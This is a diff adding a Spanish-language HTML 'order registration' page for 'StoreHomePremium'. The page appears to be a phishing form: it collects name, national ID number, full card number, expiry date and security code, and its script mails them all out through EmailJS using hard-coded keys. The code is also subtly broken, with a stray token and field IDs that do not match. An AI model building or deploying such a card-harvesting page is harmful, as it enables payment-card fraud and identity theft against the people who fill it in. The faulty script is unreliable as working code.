@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>StoreHomePremium</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: linear-gradient(180deg, #2f66d0, #6fa0ff);
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      width: 100%;
+      max-width: 420px;
+      color: white;
+    }
+    label {
+      display: block;
+      margin-top: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      margin-top: 6px;
+    }
+    button {
+      margin-top: 25px;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: #0a2f7a;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h2>StoreHomePremium – Registro de pedido</h2>
+
+    <label>Monto</label>
+    <input id="monto" type="text">
+
+    <label>Tipo</label>
+    <input id="tipo" type="text">
+
+    <label>Nombre</label>
+    <input id="nombre" type="text">
+
+    <label>Email</label>
+    <input id="email" type="email">
+
+    <label>DNI</label>
+    <input id="dni" type="text">
+
+    <label>Titular</label>
+    <input id="titular" type="text">
+
+    <label>Número de tarjeta</label>
+    <input id="número_tarj" type="text">
+
+    <label>Fecha de expiración</label>
+    <input id="fecha_expiración" type="text">
+
+    <label>Código de seguridad</label>
+    <input id="código_seguridad" type="text">
+
+    <button type="button" id="enviar">Enviar</button>
+  </div>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <script>
+    // Inicializar EmailJS con TU PUBLIC KEY
+    emailjs.init("gOD19I3u7jPioagR4");
+
+    document.getElementById("enviar").addEventListener("click", function () {
+
+      emailjs.send(
+        "service_p965auj",      // TU SERVICE ID
+        "template_h5kc29e",     // TU TEMPLATE ID
+        {
+          monto: document.getElementById("monto").value,
+          tipo: document.getElementById("tipo").value,
+          nombre: document.getElementById("nombre").value,
+          email: document.getElementById("email").value,
+          dni: document.getElementById("dni").value, ir
+          titular: document.getElementById("titular").value,
+          número_tarje: document.getElementById("número_tarjet").value,
+          fecha_expi: document.getElementById("fecha_expi").value,
+          código_seguridad: document.getElementById("código_seguridad").value
+        }
+      ).then(
+        function () {
+          alert("Formulario enviado correctamente");
+        },
+        function (error) {
+          alert("Error al enviar el formulario");
+          console.log("EmailJS error:", error);
+        }
+      );
+
+    });
+  </script>
+</body>
+</html>
